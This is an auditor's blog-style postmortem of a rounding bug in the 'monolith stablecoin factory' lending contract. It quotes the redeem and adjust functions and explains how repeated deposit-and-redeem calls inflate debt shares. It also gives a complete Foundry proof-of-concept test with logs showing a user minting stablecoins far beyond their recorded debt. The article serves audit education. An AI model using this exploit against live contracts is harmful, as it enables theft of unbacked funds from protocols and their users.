# Rounding bugs

Recenlty there was a contest called `monolith stablecoin factory`. i participated in that contest. However during that public contest i learned about new attack path and root cause that could harm the system. 

Among those exploits and root causes, there was an exploit related to rounding error. In this article i will share my learning and explain how the attacker would take advantage of roundin error in the codebase. 

# What is Rounding?

Before diving into the exploit, you should understand how numbers works in solidity. there is no floating point in solidity, solidity only supports the decimal number.

Now think of following example

```solidity
x = y / z
```

**What if we divide two numbers and the result is floating point number?**

The answer is, in solidity if you divide some numbers and the result is floating point number then solidity round them down by default. consider an example if the result is some what `0.25` then solidity will round down by default and make it `0`. Which means we loss `0.25` value due to rounding. 

However we can not only round down numbers. there are libraries that provide functionalities to round the division up and down. i will not go deep into them, because the goal of this article is postmortem of the exploit.

If you want to read more deep about rounding issue then please give a read to [rounding-in-defi](https://seceureka.com/blog/rounding-in-defi). this is great resource to understand the rounding and possible exploit scenario duu to rounding.

# The exploit in monolith.

First to get some context see these functions below. 

1. redeem function this function is used to get collateral of free debt users by providing appropriate amount of stablecoin. Anyone can call this function and redeem collateral of free debt user. This was the functionality of the protocol there is nothing wrong in this.

```solidity
function redeem(uint amountIn, uint minAmountOut) external returns (uint amountOut) {
        accrueInterest();
        // calculate amountOut in internal 18 decimals
        uint internalAmountOut = getRedeemAmountOut(amountIn); // 18 decimal collateral amount after excluding fees
        require(internalAmountOut > 0, "amount out is zero");
        // Convert to token decimals (rounds down)
        amountOut = internalToCollateral(internalAmountOut); // actual amount of collateral that being out
        require(amountOut >= minAmountOut, "insufficient amount out"); // check for minimum out token for slippage control
        
        // Check redeemable collateral in internal representation
        uint256 totalInternalCollateral = collateralToInternal(collateral.balanceOf(address(this))); // get collateral amount hold by this contract in internal representation
        // this check ensures the redeemable collateral is not redeemed
        require(totalInternalCollateral - internalAmountOut >= nonRedeemableCollateral, "Insufficient redeemable collateral");
        
        // repay on behalf of free debtors
        totalFreeDebt -= amountIn; // update the amount of free debt
        coin.transferFrom(msg.sender, address(this), amountIn);
        coin.burn(amountIn);

        // distribute collateral redemption per free debt share (in internal representation)
        // @audit did not get this
        epochRedeemedCollateral[epoch] += internalAmountOut.mulDivUp(1e36, totalFreeDebtShares); // update the epochRedeemedCollateral

        collateral.safeTransfer(msg.sender, amountOut);

        // Intentional division by zero and revert if totalFreeDebt is 0
        if( totalFreeDebtShares / totalFreeDebt > 1e9) {
            epoch++;
            totalFreeDebtShares = totalFreeDebtShares.mulDivUp(1e18,1e36); // @audit why this has done? -> 100e18 * 1e18 / 1e36
            emit NewEpoch(epoch);
        }

        emit Redeemed(msg.sender, amountIn, amountOut);
        return amountOut;
    }
```

2. adjust function is used to deposit collateral and borrow stablecoin in debt mode such as free debt or paid debt.

```solidity
function adjust(address account, int collateralDelta, int debtDelta) public {
        accrueInterest();
        updateBorrower(account);
        // Handle collateral changes
        if (collateralDelta > 0) { // adding the collateral
            // Convert incoming collateral to internal 18 decimals
            uint256 collateralAmount = uint(collateralDelta);
            uint256 internalAmount = collateralToInternal(collateralAmount); // returns 18 decimals token
            
            if(!isRedeemable[account]) nonRedeemableCollateral += internalAmount; // increase non-redeemable collateral
            
            // Store in internal 18 decimals
            _cachedCollateralBalances[account] += internalAmount; // update per account cached non redeemable collateral
            collateralAmount = collateralDecimals > 18 ? internalToCollateral(internalAmount) : collateralAmount;
            // Transfer actual token amount
            // @audit pull token from the caller instead of the account
            collateral.safeTransferFrom(msg.sender, address(this), collateralAmount);
            // this flow is fine
        } else if (collateralDelta < 0) { // reduce the collateral from the account
            // Convert from internal 18 decimals to token decimals (rounds down)
            // -10e6 -> reduce 10 usdc from the instance
            // @audit what if the user passes the collateral amount as a negative number? suppose they what to reduce 10 usdc from their collateral then 
            // amount they will specify is -10e6, bu the fnction assumes it to be in 18 decimals
            uint256 internalAmount = uint(-collateralDelta);
            uint256 collateralAmount = internalToCollateral(internalAmount); // convert collateral to normalize to it's original decimals
            
            // Ensure sufficient collateral for non-redeemable accounts
            if (isRedeemable[account]) {
                // Calculate total redeemable in internal representation
                uint256 totalInternalCollateral = collateralToInternal(collateral.balanceOf(address(this))); // returns 18 decimals token
                require(
                    totalInternalCollateral - internalAmount >= nonRedeemableCollateral,
                    "Insufficient redeemable collateral"
                );
            } else {
                nonRedeemableCollateral -= internalAmount;
            }
 
            // Withdraw collateral (stored in internal representation)
            _cachedCollateralBalances[account] -= internalAmount;
            // Transfer actual token amount (rounded down)
            // @audit it tranfer to the caller of the function instead of the account
            collateral.safeTransfer(msg.sender, collateralAmount);
        }

        // Handle debt changes
        int actualDebtDelta = debtDelta;
        if (debtDelta > 0) {
            // Borrow
            uint amount = uint256(debtDelta); // @audit does this amount has decimals? a -> this will coin with 18 decimals
            increaseDebt(account, amount);
            coin.mint(msg.sender, amount);
        } else if (debtDelta < 0) {
            // Repay
            uint amount = uint256(-debtDelta);
            uint debt = getDebtOf(account);
            if(debt <= amount) {
                amount = debt;
                actualDebtDelta = -int(debt); // Use actual debt repaid for full repayment
                decreaseDebt(account, type(uint).max);
            } else {
                decreaseDebt(account, amount);
            }
            coin.transferFrom(msg.sender, address(this), amount);
            coin.burn(amount);
        }

        // if debtDelta is non-zero, require debt balance to either be 0 or >= minDebt
        uint debtBalance = getDebtOf(account); // get updated balance
        // check ensures that the debt balance is zero or greater than the minimum debt
        if(debtDelta != 0) require(debtBalance == 0 || debtBalance >= minDebt, "Debt below minimum and larger than 0");

        // Emit event before the first early return
        emit PositionAdjusted(account, collateralDelta, actualDebtDelta);

        // Skip remaining invariants if caller does not reduce collateral AND does not increase debt
        if(collateralDelta >= 0 && debtDelta <= 0) return;

        // The caller is removing collateral and/or increasing debt. Enforce ownership beyond this point
        require(msg.sender == account || delegations[account][msg.sender], "Unauthorized");

        // Skip solvency checks if debt is zero
        if(debtBalance == 0) return;

        // Check solvency
        (uint price, bool reduceOnly, ) = getCollateralPrice();
        require(!reduceOnly, "Reduce only");
        // @audit it uses _cachedCollateralBalances which is in 18 decimals
        uint borrowingPower = price * _cachedCollateralBalances[account] * collateralFactor / 1e18 / 10000;
        require(debtBalance <= borrowingPower, "Solvency check failed");
    }
```

these functions seems good as first glace. But there is a potential rounding error that could be exploit by attacker. 

Look in the following part of the redeem function

```solidity
        if( totalFreeDebtShares / totalFreeDebt > 1e9) {
            epoch++;
       @>   totalFreeDebtShares = totalFreeDebtShares.mulDivUp(1e18,1e36);
            emit NewEpoch(epoch);
        }
```

here if `totalFreeDebtShares / totalFreeDebt > 1e9` we divide `totalFreeDebtShares` by `1e18` and rounding it up if there is reminder after division. this seems good in firts place. But think if user performs repitative `adjust` and `redeem` call?

This is the case where the user can exploit rounding. if user call these functions several times in repitation the `totalFreeDebtShares` will grow in huge number. even though the protocol assums it is denormalised by dividing by `1e18`. Note here user is not redeeming all the amount they have deposited. instad then redeeming 1 wei less amount. That is root cause of this exploit

Following is the proper output of each repitation.

```bash
Logs:
  totalFreeDebtShares: 10000
  totalFreeDebt: 1
  totalFreeDebtShares: 100000001
  totalFreeDebt: 1
  totalFreeDebtShares: 1000000010001
  totalFreeDebt: 1
  totalFreeDebtShares: 10000000100010001
  totalFreeDebt: 1
  totalFreeDebtShares: 100000001000100010001
  totalFreeDebt: 1
  totalFreeDebtShares: 1000000010001000100010101
  totalFreeDebt: 1
  totalFreeDebtShares: 10000000100010001000102010001
  totalFreeDebt: 1
  userCollateral: 9999999999999999369789999999999999999999
```

you can see after certain repitation the `totalFreeDebtShares` becomes very huge. 

Following is the POC that will demonstrate the attack fully

```solidity
    function test_drain() public {
        address user = address(1);

        ERC20Mock collateral = ERC20Mock(address(lender.collateral()));
        ERC20Mock coin = ERC20Mock(address(lender.coin()));

        vm.startPrank(user);
        collateral.mint(user, 1e40);
        coin.mint(user, 1e40);
        collateral.approve(address(lender), type(uint256).max);
        coin.approve(address(lender), type(uint256).max);

        lender.setRedemptionStatus(user, true);

        for (uint256 i; i < 7; i++) {
            lender.adjust(user, 1e23, 1e22); // 100000 collateral and 10000 debt
            uint256 totalFreeDebt = lender.totalFreeDebt(); // 10000,
            lender.redeem(totalFreeDebt - 1, 0);
        }
        
        console.log("total free debt shares:", lender.totalFreeDebtShares());
        console.log("total free debt:", lender.totalFreeDebt());
        lender.adjust(user, 1e23, 1e22); // 100000001000100010000000000000000000001
        console.log("total free debt shares:", lender.totalFreeDebtShares());
        console.log("total free debt:", lender.totalFreeDebt());

        address user2 = address(2);
        collateral.mint(user2, 1e23);
        vm.startPrank(user2);
        collateral.approve(address(lender), type(uint256).max);
        lender.setRedemptionStatus(user2, true);
        lender.adjust(user2, 1e23, 1e22);
        
        console.log("total free debt shares:", lender.totalFreeDebtShares());
        console.log("total free debt:", lender.totalFreeDebt());

        vm.startPrank(user);

        uint256 totalFreeDebt = lender.totalFreeDebt();
        coin.mint(user, totalFreeDebt);

        lender.redeem(totalFreeDebt - 1, 0);

        console.log("%e", lender.totalFreeDebtShares());
        console.log(lender.totalFreeDebt());

        vm.startPrank(user2);
        coin.approve(address(lender), type(uint256).max);
        lender.adjust(user2, 0, -1);

        console.log("%e", lender.totalFreeDebtShares());
        console.log(lender.totalFreeDebt());

        vm.startPrank(user2);
        // user2 has ~1e22 collateral, but is able to borrow 1e27;
        lender.adjust(user2, 0, 1e27);
        uint256 debt = lender.getDebtOf(user2);
        console.log("debt %e", debt); // user borrowed 1e27, but has only 1e22 debt
    }
```

Now Look into this part of code:

```solidity
uint shares = totalFreeDebt == 0 ? 
                    amount : 
             @>       amount.mulDivUp(totalFreeDebtShares, totalFreeDebt);
```

in this part if `totalFreeDebt` is non zero then the share calculation depends on `totalFreeDebtShares`. However if we see in the POC at the end of the repitative call the `totalFreeDebt` is only 1 wei in the entier system and `totalFreeDebtShares` is very huge as i discussed above. This will lead to mint huge amount of shares to the user. 

now if user repat 1 wei of free debt the `totalFreeDebt` will become zero and result in minting exect amount of share as deposit. However this minted share is worth less then actual debt. This would allow user to steal unbacked stablecoins out of this air. 

If we see the output of the POC we can see the actual debt is more then the recorded shares minted to the user.

```bash
[PASS] test_drain() (gas: 1138922)
Logs:
  2.00000002000200020002050200020101e32
  1
  1.00000001000100010001030100010101e32
  0
  debt 9.999899900991990170185e21
```


# Conclusion

The main focu of the attack and this article was the rounding issue the user can abuse againts the protocol. in this scenario i understood and got idea how an attacker can do repitative calls to break assumtion of the protocol and harm the protocol. 

While auditing such type of rounding problem. Always consider the edge casees. Also consider when to round up and when to round down. A wast thinking in such a way would make you better then others.

> **Note:-** I have written this article according to my understanding of the attack and root cause, However the attack is focusing on the core things which are done worngly. that might be possible that you do not get this article. But there are more reports out there for such kind of attacks, always keep in mind the smart contract audit is not about remembering attack it all about the understand the system and identify the wrong things.
